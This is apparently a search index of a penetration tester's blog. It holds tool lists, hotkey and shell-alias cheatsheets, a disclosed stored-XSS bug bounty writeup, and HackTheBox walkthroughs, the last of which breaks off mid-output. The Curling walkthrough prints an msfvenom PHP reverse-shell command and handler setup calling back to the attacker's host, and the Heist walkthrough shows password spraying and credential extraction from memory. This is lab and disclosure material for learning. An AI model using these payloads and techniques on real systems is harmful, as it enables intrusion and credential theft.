[
  
  {
    "title": "Toolbox",
    "url": "/posts/toolbox/",
    "categories": "Cheatsheet, Toolbox",
    "tags": "Tools",
    "date": "2022-04-03 13:55:00 +0100",
    





    "snippet": "This will be a growing list of the tools that have made my life easier and hopefully wil do the same for you.I will try and limit this list to the best of the best. Everything else check out My Github Stars List there is loads on there&lt;/br&gt;Windows      Mobaxterm - This is great for managing logo sessions to boxes when you are on a job.  This has a nice SSH Tunnel tool. Also can spin up a number of services quickly  web, ftp, smb…est    Ueli - This is a great app. have your own customizable launcher with some great plugins. helps speed up my workflow because you can access things so quicklyI like the shortcuts feature alot  dngrep - powerful windows grep tool  AutoHotKey - Dont work harder work smarter. This can help you with creating macros and little scripts for things you do more than once or to speed things up..Automate it all!!  I have released a few tools using this:  Vulnsearch - this will search on popular exploit websites for vulns for you  Secpol - Exports the GUI version from secpol.msc to csv file  NETworkManager a .net GUI network manager for windows - has a few nice features  SauronEye - This is a great .NET for searching for passwords in files  PowerToys - useful for custom snap window management and layouts&lt;/br&gt;Linux  ZSH - my new found love. sorry bash!! loads of plugins and customizability. Ive got a post on this  peco  duplicut - useful for making wordlists removing duplicates but keeping the order  fzf - fuzzy search  bat- like cat but better  Traitor - a cool priv esc tool to check the low hanging fruit&lt;/br&gt;Browser  pwnfox - this is really good for seperation testing allowing you to have sandbox tab so can login with another account.  wappalyser - find out what technologies are used by the app  retire.js - This is good for findings vulnerable web components - jquery..est. The browser plugin is great - Firefox Addon, Chorme Extention  foxyproxy - quick and easy proxy switcher  start.me I use this like a bookmark dashboard and find it useful to quickly find resourece and get where I want to go. Checkout the dashboard I made https://github.com/shifty0g/start-me  Hack-Tools - A swiss army knife&lt;/br&gt;Web Application Testing  Burp Suite - Pretty much the gold standard when it comes to webapp testing. it does so so much. It likes to eat all your ram . nom nom nom . The community version is great  Nuclei - This is amazing!. A community supported template based -vulnerbility scanner.  Nuceli-Template - Good to update them regullary  Aquatone - so far the best for web screenshots. can supply it a url list or nmap file  Httpx - another gem from the projectdiscovey guys. this will check if the url is alive. really nice output options  Concurl - run curl currently ;) then grep what comes out  FeroxBuster - This it the next evolution of gobuster and quicklybecomming my goto.  SQLInjectionWiki - Great resource to lean on when picking at SQLI&lt;/br&gt;Burp Pluginshttps://apps.burpsuite.guide/  Authorize - good for seperation and access control testing. works well with pwnfox. hoover in a low priv cookie and it will follow along ur browser high priv account&lt;/br&gt;Online Tools  SecuirtyHeaders.com - Make sure to select private  CyberChef - Always one to keep bookmarked. Its is my go to when seeing some nonsense hash  endoflife - useful to lookup software to see if its EOL&lt;/br&gt;Active Directory  linWinPwn&lt;/br&gt;Parsing  nessus-file-parser - if you dont know about this one then now u do! This was a game changer when i found it . This amazing python script will parse multiple .nessus files to a spreadsheet that makes sense. This then gives you the power to filter and search in excel away from the horrid nessus GUI  ultimate-nmap-parser - I know shameless plug. I made this a long time ago and still use it most tests. This will parse out .gnmap files  xurls - This will parse out urls from anything you pipe into it  gf - Another great tool from tomnomnom. essentially have a quick access grep library to run say over your concurl output&lt;/br&gt;Infastructure Testing  nmap -  Lets be honest there is no better scanner. Never has never will. I dont need to say much else :wink:  RustScan - Super duper fast portscanner written in Rust  Brutespray - This is great for automated brutefocing. will take in a nmap file and blast ur wordlists.  u may want to skip ssh and other tempremental protocls  nndefaccts - nmap script with better dataset for checking default creds  CrackMapExec - Another must for the toolbox. a swissarmy knife for smb and other ports. This is the big daddy  Scrying - take screeenshots of web,rdp,vnc - takes in nmap or nessus file  Pwncat - a nice little manger for your shells  Godance - useful tool to bruteforce SMB. compiled exe runs on old windows versions  PowerHuntShares - Really useful powershell script for checking smb shares  WinShareEnum - Another useful GUI tool for enumerting shares  Name-That-Hash - useful for figuring out what hash  ssh-audit - great to check ssh ports&lt;/br&gt;Bug Bounty  Rengine - really cool automated recon tool. do alot of the basic checks whilst your feet are up&lt;/br&gt;Red Team  Cobalt Strike - This is a great C2. aftre using this I cant go back  Pwndrop - useful web server to upload / download&lt;/br&gt;Misc  Mega.nz - I use this to sync my testing tools and notes. No client data ;) helpful if you have multiple systems and a nice backup too… FREE aswell  Ngrok - This is great tool for getting a public ip or address. I use this if i need to quickly run a web server over the internethttps://github.com/carlospolop/PEASS-ng"
  },
  
  {
    "title": "Learn the HotKeys",
    "url": "/posts/HotKeys/",
    "categories": "Cheatsheet",
    "tags": "HotKeys",
    "date": "2022-01-22 13:55:00 +0100",
    





    "snippet": "As with all posts this will be a growing WIP as and when.You should learn hotkeys for the stuff you use day to day using a mouse is slow and even worse on a laptop touch pads are painful.  Here are some resources for hotkeys.WindowsWindows keyboard ShortcutsKaliCreating Custom Kali Hotkeys\tHotkeys```New Termianl  Window\t\tCTRL + ALT + T      New Tab                     CTRL + SHIFT + T    Next Tab                    CTRL + PGUP         Last                        CTRL + PGDN         Clear Terminal              CTRL + L            Zoom in                     CTRL + +            Zoom Out                    CTRL + -            ```&lt;/br&gt;&lt;/br&gt;BurpIf your a webapp guy and use burp thenHotKeys are defined by going to User Options\tHotkeys\t```Send to Repeater\t\t\t\t\t\tCtrl+RSend to Intruder\t\t\t\t\t\tCtrl+IForward intercepted Proxy message\t\tCtrl+FToggle Proxy interception\t\t\t\tCtrl+TSwitch to Target\t\t\t\t\t\tCtrl+Shift+TSwitch to Proxy\t\t\t\t\t\t\tCtrl+Shift+PSwitch to Scanner\t\t\t\t\t\tCtrl+Shift+SSwitch to Intruder\t\t\t\t\t\tCtrl+Shift+ISwitch to Repeater*\t\t\t\t\t\tCtrl+Shift+RSwitch to Suite options\t\t\t\t\tCtrl+Shift+OSwitch to Alerts tab\t\t\t\t\tCtrl+Shift+AGo to previous tab\t\t\t\t\t\tCtrl+MinusGo to next tab\t\t\t\t\t\t\tCtrl+Equals (=)Issue Repeater Requestest               Ctrl + SpaceCut\t\t\t\t\t\t\t\t\t\tCtrl+XCopy\t\t\t\t\t\t\t\t\tCtrl+CPaste\t\t\t\t\t\t\t\t\tCtrl+VUndo\t\t\t\t\t\t\t\t\tCtrl+ZRedo\t\t\t\t\t\t\t\t\tCtrl+YSelect all\t\t\t\t\t\t\t\tCtrl+ASearch\t\t\t\t\t\t\t\t\tCtrl+SGo to previous search match\t\t\t\tCtrl+Comma (,)Go to next search match\t\t\t\t\tCtrl+PeriodURL-decode\t\t\t\t\t\t\t\tCtrl+Shift+UURL-encode key characters\t\t\t\tCtrl+UHTML-decode\t\t\t\t\t\t\t\tCtrl+Shift+HHTML-encode key characters\t\t\t\tCtrl+HBase64-decode\t\t\t\t\t\t\tCtrl+Shift+BBase64-encode\t\t\t\t\t\t\tCtrl+BBackspace word\t\t\t\t\t\t\tCtrl+BackspaceDelete word\t\t\t\t\t\t\t\tCtrl+DeleteDelete line\t\t\t\t\t\t\t\tCtrl+DGo to previous word\t\t\t\t\t\tCtrl+LeftGo to previous word (extend \t\t\tCtrl+Shift+LeftGo to next word\t\t\t\t\t\t\tCtrl+RightGo to next word (extend)\t\t\t\tCtrl+Shift+RightGo to previous paragraph\t\t\t\tCtrl+UpGo to previous paragraph (extend)\t\tCtrl+Shift+UpGo to next paragraph\t\t\t\t\tCtrl+DownGo to next paragraph (extend)\t\t\tCtrl+Shift+DownGo to start of document\t\t\t\t\tCtrl+HomeGo to start of document (extend)\t\tCtrl+Shift+HomeGo to end of document\t\t\t\t\tCtrl+EndGo to end of document (extend)\t\t\tCtrl+Shift+EndSwitch to Dashboard                     Ctrl + Shift + D Editor: Go to next search match         Ctrl + Period (.)Go to Previous Tab                      Ctrl + minus (-)```&lt;/br&gt;Web BrowserWordGet things done quicker in word. navigating word can be a nightmare. here are some default hotkeys i find userful\tHotkeys```Align Centre\t\tCTRL + E\t\t    Align Left\t\t\tCTRL + L \t\t    Alight Right\t\tCTRL + Right\t    Bold / Un Bold\t\tCTRL + B            Split Window\t\tALT + CTRL + S      Normal Font\t\t\tCTRL + SHIFT + N\tHeading 1 \t\t\tCTRL + ALT + 1\t\tHeading 2 \t\t\tCTRL + ALT + 2\t\tHeading 3 \t\t\tCTRL + ALT + 1\t\tFind\t\t\t\tCTRL + F            Undo\t\t\t\tCTRL + Z            Redo\t\t\t\tCTRL + Y            Open Styles \t\tCTRL + ALT + Shift + S\t ```&lt;/br&gt;You can also make your own so the power is endless. I have a few extra styles.  Further stuff can be done with Macros which I will write up at some point  Microsoft - Customizing Word Shortcut keys  Word Shortcut keys List   Microsoft - Office Keyboard Shortcuts  Business Insider - M$ HotkeysExcelOnenoteNotepad++https://www.makeuseof.com/notepad-plus-keyboard-shortcuts/Cobalt Strike\tHotkeys```# Beacon InteactClear       CTRL + L  ```&lt;/br&gt;Visual Studio CodeVisual Studio Code - Hotkeys"
  },
  
  {
    "title": "So I actually found a bug in the wild (XSS)",
    "url": "/posts/xss-bug-writeup/",
    "categories": "Writeup",
    "tags": "XSS, Bug-Bounty, WebApp",
    "date": "2022-01-22 13:55:00 +0100",
    





    "snippet": "Yep i Finally found one. I found Stored XSS on bzscan and it wasnt on purpose. :laughing:So a while ago was on a testing some front end webappp which uses the Binance Smart ChainIt was possible to include a stored cross-site scripting payload into a transaction which was found to execute. The payload gets encoded within the data parameter of the HTTP request as shown belowPayload: &lt;marquee onclick=\"alert(1)\"&gt;test&lt;/marquee&gt;Parameter: Data (Ascii HEX)HTTP Request:POST / HTTP/1.1Host: data-seed-prebsc-1-s1.binance.org:8545Content-Length: 852Sec-Ch-Ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"Accept: application/jsonContent-Type: application/jsonSec-Ch-Ua-Mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36Sec-Ch-Ua-Platform: \"Windows\"Origin: chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknnSec-Fetch-Site: noneSec-Fetch-Mode: corsSec-Fetch-Dest: emptyAccept-Encoding: gzip, deflateAccept-Language: en-GB,en-US;q=0.9,en;q=0.8Connection: close{\"id\":2929565956701,\"jsonrpc\":\"2.0\",\"method\":\"eth_estimateGas\",\"params\":[{\"from\":\"XXXX\",\"to\":\"YYYY\",\"value\":\"0x0\",\"data\":\"0x258aa60d00000000000000000000000044e60930c1c5c27d51f83a15a5e142299cee5b4b00000000000000000000000000000000000000000000010f0cf064dd59200000000000000000000000000000000000000000000000000000000000000967a7600000000000000000000000000000000000000000000000000000000001e187e000000000000000000000000000000000000000000000006c6b935b8bbd40000000000000000000000000000000000000000000000000000009b6e64a8ec6000000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000002a3c6d617271756565206f6e636c69636b3d22616c657274283129223e746573743c2f6d6172717565653e00000000000000000000000000000000000000000000\"}]}Decoding the data parameter from ascii hex we can see the payload has been included.%.¦..................*&lt;marquee onclick=\"alert(1)\"&gt;test&lt;/marquee&gt;......................This gets injected sucessfully and stored in the blockchainon the 2nd from bottom Data line change it from Hex to text.You will notice the word test going across the screen which tells us the HTML code is being executed. When clicking the mouse alert(1) will be tiggered as shown in the screenshot below.Here is a little gif demoI submitted a report to Bscscan who have resolved the issue and thanked me putting me into their hall of famehttps://bscscan.com/bugbounty:sunglasses:"
  },
  
  {
    "title": "Linux Magic",
    "url": "/posts/linux-magic/",
    "categories": "Cheatsheet",
    "tags": "Cheatsheet, Linux",
    "date": "2022-01-22 13:55:00 +0100",
    





    "snippet": ":tophat:So here is a collections of bits I have in my .zshrc (yes im a zsh guy)These are mostly alias and functions which can be added into .bashrc or .zshrc file providing you have the tool setup correctly. I will try to include anything else needed in the rlevent section.I will keep adding cool bits to this list overtime. :smile:enjoygrepsome day to day greps that always useful to keep at the ready.# colored grepalias grep='grep --color=auto'alias egrep='egrep --color=auto'alias fgrep='fgrep --color=auto'# grep out just ip address 129.168.0.1 (cat nmap.gnmap | grep-ip)alias grep-ip='grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\"' # grep out just ipv6 address  3ffe:1900:4545:3:200:f8ff:fe21:67cf (ifconfig | grep-ip6)alias grep-ip6='grep -oE \"(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\"'# grep out just MAC addres 08:00:27:3b:0c:7d (ifconfig| grep-mac)alias grep-mac=\"grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'\" # grep out URL http://test.com -  may need to tidy output up a little alias grep-url=\"egrep -o 'http.+'\"nmaplist out the nmap scriptsjust a lazy one to quickly list out the nmap scripts avalible. somehow i use it quite a bit along with grepalias nmap-scripts='ls -la /usr/share/nmap/scripts/'update nmap script DBalias to update nmap and its scripts databasealias nmap-update=\"sudo apt-get install nmap &amp;&amp; nmap -script-updatedb\"Nmap aliasquite a few useful alias# host discoveryalias nmap-ping='sudo nmap -sP -v -n -oA nmap_ping $1'alias nmap-xmas='sudo nmap -n -sX -oN nmap_xmas $1'alias nmap-protocol='sudo nmap -T4 -sO $1 -oA nmap_proto'alias nmap-disc-adv='sudo nmap -v -n -PE -PM -PS21,22,23,25,26,53,80,81,110,111,113,135,139,143,179,199,443,445,465,514,548,554,587,993,995,1025,1026,1433,1720,1723,2000,2001,3306,3389,5060,5900,6001,8000,8080,8443,8888,10000,32768,49152 -PA21,80,443,13306 -oA nmap_disc_adv $1'alias nmap-disc-adv2='nmap -sn --min-hostgroup 100 -vv --max-hostgroup 125 -PE -PM -PS21,22,23,25,26,53,80,81,110,111,113,135,139,143,179,199,443,445,465,514,548,554,587,993,995,1025,1026,1433,1720,1723,2000,2001,3306,3389,5060,5900,6001,8000,8080,8443,8888,10000,32768,49152 -PP -PU161,139 -PA22,80,443,445,3389 --source-port 53 $1 -oA nmap_disc_adv2'# tcpalias nmap-tcp-fast='nmap -sSV -F -vv --reason -oA nmap_tcp_fast $1'alias nmap-tcp-full='nmap -sSV -vvv -p0- --reason -oA nmap_tcp_full $1'alias nmap-tcp-fullconn='nmap -sTV -vv -p0- --reason -oA nmap_tcp_fullconn $1'alias nmap-tcp-def='nmap -sSV -vv --reason --script=banner,version -oA nmap_tcp_def_safe $1'# udpalias nmap-udp-def='nmap -v -sU -Pn -n --reason -oA nmap_udp_def $1'alias nmap-udp-fast='nmap -v -Pn -sU -n -F --reason -oA nmap_udp_fast $1'# vulnscan# this needs the vulscan script installing - https://github.com/scipag/vulscanalias nmap-tcp-vulnscan='nmap -sS -v --reason --script=vulscan/vulscan.nse --script-args vulscanshowall=1 -oA nmap_vulnscan $1'# nmap - deeper scriptsalias nmap-tcp-def-script-vuln-unsafe='nmap -sSV ---script exploit,vuln --script-args=unsafe=1 -oA nmap_tcp_script-vuln-unsafe $1'alias nmap-tcp-fast-script-heavy-unsafe='nmap -sSV -F --script vuln,brute,exploit,intrusive,fuzzer --script-args=unsafe=1 -oA nmap_tcp_script-heavy-unsafe $1'# Useage  examples:nmap-tcp-full\t192.168.1.1/24nmap-udp-def\t192.168.1.2Metasploit# update metasploit **BE CAREFUL**alias m-update='apt update; apt install metasploit-framework'alias msf='service postgres start; msfconsole'Nessus# start servicealias nessus-start='service nessusd start'# stop servicealias nessus-stop='service nessusd stop'#update nessusalias nessus-update='/opt/nessus/sbin/nessuscli update --all'# nessus clialias nessus-cli='/opt/nessus/sbin/nessuscli'# start nessus and open in firefoxalias n=\"service nessusd start &amp;&amp; sleep 1.5 &amp;&amp; nohup firefox https://localhost:8834/ &amp;&gt;/dev/null &amp;\"Log InfoThis function is useful just to quickly save a record of things such as IP Address, Current User and Time before you start a test.creates a file called info.txt in current directorystick in your .bashrc or .zshrcUse: loginfofunction loginfo () {#logfile=\"info_$(date \"+%m-%d-%y_%H-%M\").txt\"logfile=\"info.txt\"echo \"---------------------\" | tee  $logfileecho \"date:\"                 | tee -a $logfileecho \"---------------------\" | tee -a $logfiledate                         | tee -a $logfileecho \"---------------------\" | tee -a $logfileecho \"User:\"                 | tee -a $logfileecho \"---------------------\" | tee -a $logfileid\t\t\t\t\t\t\t | tee -a $logfileecho \"---------------------\" | tee -a $logfileecho \"pwd\"                   | tee -a $logfileecho \"---------------------\" | tee -a $logfilepwd                          | tee -a $logfileecho \"---------------------\" | tee -a $logfileecho \"ifconfig:\"             | tee -a $logfileecho \"---------------------\" | tee -a $logfileifconfig                     | tee -a $logfileecho \"---------------------\" | tee -a $logfileecho \"Route:\"                | tee -a $logfileecho \"---------------------\" | tee -a $logfileroute                        | tee -a $logfileecho \"---------------------\" | tee -a $logfileecho \"/etc/resolv.conf\"      | tee -a $logfileecho \"---------------------\" | tee -a $logfilecat /etc/resolv.conf         | tee -a $logfileecho \"---------------------\" | tee -a $logfileecho \"nmap --iflist\"      | tee -a $logfileecho \"---------------------\" | tee -a $logfilenmap --iflist\t\t       | tee -a $logfileecho \"---------------------\" | tee -a $logfile}loopageMoved this over to a seperate post - see [Loopage])(add link)"
  },
  
  {
    "title": "Level Up your Game!",
    "url": "/posts/level-up/",
    "categories": "Tips",
    "tags": "Tips",
    "date": "2022-01-13 00:00:00 +0100",
    





    "snippet": "This is where I dump my rambles and serves mainly as a page for me to read now and then reminding me of things as I try to level up on my quest.“Minimize, Systemize, Automize” Touch TypingThe faster and better you type with less mistakes the more productive u can be and dump your brain quicker. Spend 15mins daily and master itLean to Codebash, powershell, python, javascript ..watever find one and learn it. this has helped me loads. automate repeated boring stuff with scripts so u can do the fun stuff. This will really help with efficency. I really like bash its like legoHotkeyslearn hotkeys to speed up your workflow. Windows, Linx, Browser, Burp, Word..est learn the ones for the stuff u use alot.Make your own with AutoHotKeyMake Checklistshaving checklists and cheatsheets are useful for building consistency and allows you to continuly refine your processes. I have these for each type of testing i do. Allows me to tick off and know what ive done and what needs finshed. I mainly use spreadsheets because i can add macros in to complete certain bitsMacroslearn some basic vba and create macros to help you report. formatting ones. it will take some time but can make reporitng life alot better. Stuff like seeting boarder and colour of tables or  crop, centring and adding in a caption for images.  there is lots u can do here.AutoHotKey can come in use here. I know i keep recomending itCreate a Personal WikiHave somewhere to document ur notes, checklists est. When I started I used Onenote as a scapbook saving stuff from everywhere i can find into sections so i had a crude place i can search for bits and bobs… was also helpful as it worked offline so can access it when undeground stuck in a DC with not internet.OrganizationHave a tidy notes, folder structure. it will help u out keep all your testing data in one location project under 1 folder.Template ItCreate templates and build up databases of stuff you use regullarly. For example when repporting i have databaes of findings, tables, exec summaries which i can refer to and copy and paste in making things alot less painful.Database ItHave a database of findings. stuff you see day in day out. have a database. even if its just a folder strucutre of markdown files.Note Takinglearn to take notes and what notes u should record. keep it to the point and think can it be used in the report. dont want to have to do multple steps. Try and do things once. Make sure you note down the things you did when and result. Another tester may need to take over and its good to not do the same things twice and waste time familarizing so can speed things up.Learn MarkdownThis can give you a framework for writing your notes. plus in some editors you get pretty colours ;)Learn the Basics Firstive found that learning the basics before jumpinging into the more advanced sexy issues and tools helped me understand whats going on and how to troubleshoot so much betterMaster Your Operationg SystemKnow your daily driver inside and out or know them all.  I maninly focuse on windows and kaliPractise Daily or as much as you can!Being a l33t hax0r takes practise. Im barely a script kidde but I know as like with blacksmithing you wont make a cool sword on your first attempt it takes practise, practice, pracise. I struggle nowdays with time but try to do CTFs when i can just to learn new things and try to keep up.I do really like TryHackMe for this. You can pikcup lots of little good bitsLearn from your mistakespretty obvious one . if you fall analyze how you can do better, what can you put in place so it doesnt happen again.Backupsmake sure u have them!! take them regularryMake things and share themFind CommunitySomething i need to do more! The Internet is massive you can find cool places to hang out and talk shop.Know your tools!make sure you know the tools you use day in day out. know its limitations and things to check and even the troll issues..Nessus ;)"
  },
  
  {
    "title": "Heist - Hack The Box",
    "url": "/posts/htb-writeup-heist/",
    "categories": "CTF, HackTheBox",
    "tags": "CTF, HackTheBox",
    "date": "2019-11-30 00:00:00 +0100",
    





    "snippet": "Heist starts off with a support page with a username and a Cisco IOS config file containing hashed &amp; encrypted passwords. After cracking two passwords from the config file and getting access to RPC on the Windows machine, I find additional usernames by RID cycling and then password spray to find a user that has WinRM access. Once I have a shell, I discover a running Firefox process and dump its memory to disk so I can do some expert-level forensics (ie: running strings) to find the administrator password.Summary  The admin page has guest access enabled and we can find a Cisco IOS configuration file on there  After cracking the three passwords from the config file, we are able to use rpcclient with one of the account to recover the list of usernames  Then we password spray the credentials we have and find that user chase can log in with WinRM  There’s a Firefox process already running on the box and we can obtain a memory dump from it  We find the administrator credentials in one of the browser request still in memoryPortscanroot@kali:~/htb/heist# nmap -sC -sV -p- -oA heist 10.10.10.149PORT      STATE SERVICE       VERSION80/tcp    open  http          Microsoft IIS httpd 10.0| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php135/tcp   open  msrpc         Microsoft Windows RPC445/tcp   open  microsoft-ds?5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49668/tcp open  msrpc         Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWebsiteThe webpage has a simple login page with an option to log in as guest at the bottom:After logging in as guest, I find a Cisco configuration in the opened trouble tickets. I also make note of the Hazard username, this will be useful later.Cracking some credentialsThe Cisco IOS configuration file here has two different types of password hashes. Cisco uses various hash algorithms across different products and software versions. The old password encryption type is called Type 7 encryption and has been known to be extremely weak for about 20+ years now. I still see this being used in production environments every week even though it doesn’t provide any real security (it’s akin to just base64 encoding your passwords in your configs, it’s trivial to recover the plaintext).For the two usernames, the Type 7 passwords can be reversed with any of the many Type 7 reversing tools available such as https://packetlife.net/toolbox/type7/.  rout3r / $uperP@ssword  admin / Q4)sJu\\Y8qz*A3?dThe enable password uses the Type 5 encryption which is just a salted MD5 hash. Again, these should be avoided whenever possible since they can be cracked pretty quickly using a GPU. Using Type 8 (PBKDF2) or Type 9 provides more security since it takes longer to crack.With John, I’m quickly able to crack the password with the rockyou.txt list:root@kali:~/htb/heist# john -w=/usr/share/wordlists/rockyou.txt hash.txtWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusstealth1agent    (?)User enumeration with RPC clientI’ll create user.txt and add the potential usernames that I have so far (admin, administrator and hazard) then do the same with passwords in pass.txt. To test all credentials, I use crackmapexec:I found one valid account: hazard:stealth1agentScanning with smbmap I don’t find any open shares that this user has access to:root@kali:~/htb/heist# smbmap -u hazard -p stealth1agent -H 10.10.10.149[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.149...[+] IP: 10.10.10.149:445\tName: heist.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tC$                                                \tNO ACCESS\tIPC$                                              \tREAD ONLYWith rpcclient I can connect and query the SID for the hazard user:root@kali:~/htb/heist# rpcclient -U hazard 10.10.10.149Enter WORKGROUP\\hazard's password:rpcclient $&gt; lookupnames hazardhazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)I can enumerate the list of users with lookupsids by changing the last digit of the SIDI got two additional users: chase and jasonLogging in to the box with WinRM and user chaseAfter password spraying with crackmapexec again, I found valid credentials for chaseThe port for WinRM is open so I’ll use that to log in:Note: I’m using evil-winrm these days but those screenshots were taken some time ago before I started using it.require 'winrm'# Author: Alamotconn = WinRM::Connection.new(  endpoint: 'http://10.10.10.149:5985/wsman',  #transport: :ssl,  user: 'chase',  password: 'Q4)sJu\\Y8qz*A3?d',  :no_ssl_peer_verification =&gt; true)command=\"\"conn.shell(:powershell) do |shell|    until command == \"exit\\n\" do        output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\")        print(output.output.chomp)        command = gets        output = shell.run(command) do |stdout, stderr|            STDOUT.print stdout            STDERR.print stderr        end    end    puts \"Exiting with code #{output.exitcode}\"endExtracting more credentials from FirefoxI’ll upgrade that shell to a Meterpreter first:I check out the c:\\inetpub\\wwwroot\\ directory for any hardcoded credentials in the PHP code and find a SHA256 hash for an admin account in the login.php file:hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040')Fail: I wasn’t able to crack this hash nor did I find it on crackstation.net.When checking out the running processes, I notice that Firefox is running: 6264  5232  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6388  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6588  792   wsmprovhost.exe          x64   0        SUPPORTDESK\\Chase  C:\\Windows\\System32\\wsmprovhost.exe 6656  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6732  792   dllhost.exe              x64   1        SUPPORTDESK\\Chase  C:\\Windows\\System32\\dllhost.exe 7052  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exeIf Firefox is running then there might some credentials in memory so I’ll use procdump to create a memory dump and inspect it after:Before using a memory forensics tool like Volatility to inspect the memory dump, I’ll try using strings and grep to look for the string password:Looks like I found the admin’s credentials, I’ll use WinRM again to log in:"
  },
  
  {
    "title": "Curling - Hack The Box",
    "url": "/posts/htb-writeup-curling/",
    "categories": "CTF, HackTheBox",
    "tags": "CTF, HackTheBox",
    "date": "2018-12-11 00:00:00 +0100",
    





    "snippet": "  The username for the Joomla site is Floris which is the author of posts.  The password is a variant of a word on the main page: Curling2018!  On the Joomla admin page we can inject a meterpreter reverse shell in the index.php file of the template in-use  After getting a shell, we can download a password backup file, which is compressed several times, and contains the password for user floris  User floris controls a input file used by curl running in a root cronjob. We can change the config file so that cURL gets our SSH public key and saves it into the root ssh directoryecho \"10.10.10.150 curling.htb\" &gt;&gt; /etc/hostsNmapStart with a full TCP port scan which only found a webserver running on port 80 and ssh on 22 so not much to really work with.# Nmap 7.70 scan initiated Tue Dec 11 13:41:24 2018 as: nmap -sSV -p0- -oA nmap_tcp_full curling.htbNmap scan report for htb.curling (10.10.10.150)Host is up, received user-set (0.038s latency).Scanned at 2018-12-11 13:41:59 GMT for 173sNot shown: 65534 closed portsReason: 65534 resetsPORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 208.44 secondsJoomlaRunning nikto and joomscan didnt return anything of intreast. So started to have a mooch about noticing the following:      The site name is Cewl Curling site!, a hint to use the CeWL tool to scrape a website generating wordlist from it.        The first post reveals the username for the administrator: Floris  Next had a look at the source code and noticed the following commentchecking /secret.txt reveals a base64 string which i decoded to reveal Curling2018!Username: FlorisPassword: Curling2018!Now can login to the admin page using the creds above - http://curling.htb/administrator/index.phpGetting a ShellTime to get a shellmsfvenom was used to generate a simple php shellmsfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.210 LPORT=4446 &gt; php-meterpreter-staged-reverse-tcp-4666.phpThe file upload functionality on the main page was abused to upload the shell sucessfully as it allows php files.setup and run the msf handlermsf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost tun0msf exploit(multi/handler) &gt; set lport 4446msf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 10.10.14.210:4446Clicking on the link in the upload dialogue establishes the shellhttp://10.10.10.150/images/php-meterpreter-staged-reverse-tcp-4666.php[*] Sending stage (38247 bytes) to 10.10.10.150[*] Meterpreter session 1 opened (10.10.14.210:4666 -&gt; 10.10.10.150:42196) at 2018-12-11 16:43:13 +0000msf exploit(multi/handler) &gt; sessions Active sessions===============  Id  Name  Type                   Information              Connection  --  ----  ----                   -----------              ----------  1         meterpreter php/linux  www-data (33) @ curling  10.10.14.210:4666 -&gt; 10.10.10.150:42196 (10.10.10.150)msf exploit(multi/handler) &gt; sessions -1[*] Starting interaction with 1...meterpreter &gt; sysinfoComputer    : curlingOS          : Linux curling 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 